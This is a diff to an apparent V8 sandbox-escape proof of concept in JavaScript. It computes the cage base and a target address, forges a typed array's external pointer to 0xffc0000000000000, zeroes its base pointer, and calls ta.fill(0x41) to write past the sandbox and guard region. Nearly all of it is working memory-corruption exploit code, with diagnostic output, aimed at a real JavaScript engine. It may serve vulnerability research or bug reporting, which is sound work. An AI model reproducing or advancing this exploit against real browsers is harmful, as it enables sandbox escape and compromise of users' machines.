@@ -125,17 +125,23 @@ function main() {
     cur = next;
   }
 
+  const cage_base_rel = cur & ~0xffffffffn;   // sandbox-relative
+  const kDecoded     = 0xffc0000000000000n >> 24n;  // 0xFFC0000000
+  const target_rel   = cage_base_rel + kDecoded;    // sandbox-relative target
+
   print(`[+] ta displaced → sandbox+0x${cur.toString(16)} (${(Number(cur)/2**30).toFixed(1)} GB)`);
-  print(`[+] cage_base = sandbox_base + ${(Number(cur & ~0xffffffffn)/2**30).toFixed(0)} GB`);
+  print(`[+] cage_base  = sandbox_base + 0x${cage_base_rel.toString(16)} (${(Number(cage_base_rel)/2**30).toFixed(0)} GB)`);
+  print(`[+] target     = sandbox_base + 0x${target_rel.toString(16)} (${(Number(target_rel)/2**30).toFixed(1)} GB)`);
+  print(`    sandbox_end = sandbox_base + 0x10000000000  (1024 GB)`);
+  print(`    guard_end   = sandbox_base + 0x14800000000  (1312 GB)`);
+  print(`    0x${target_rel.toString(16)} > 0x14800000000 → ${target_rel > 0x14800000000n ? "OUTSIDE sandbox+guard ✓" : "inside (BUG)"}`);
+  print(``);
 
   writeBytes(cur, templateBytes);
   writeU32(cur + BigInt(kBasePointerOffset), 0);
   writeU64(cur + BigInt(kExternalPointerOffset), 0xffc0000000000000n);
 
-  print(`[+] Forged external_pointer = 0xffc0000000000000`);
-  print(`    decoded target = cage_base + 0xFFC0000000 ≈ 1315 GB from sandbox_base`);
-  print(`    sandbox+guard ends at 1312 GB → 3 GB outside ✓`);
-  print(`[*] Triggering ta.fill(0x41) → expect V8 sandbox violation...`);
+  print(`[*] Triggering ta.fill(0x41) → expect crash at absolute addr sandbox_base+0x${target_rel.toString(16)}...`);
 
   ta.fill(0x41);  // → SEGV_MAPERR outside sandbox VAS
 }
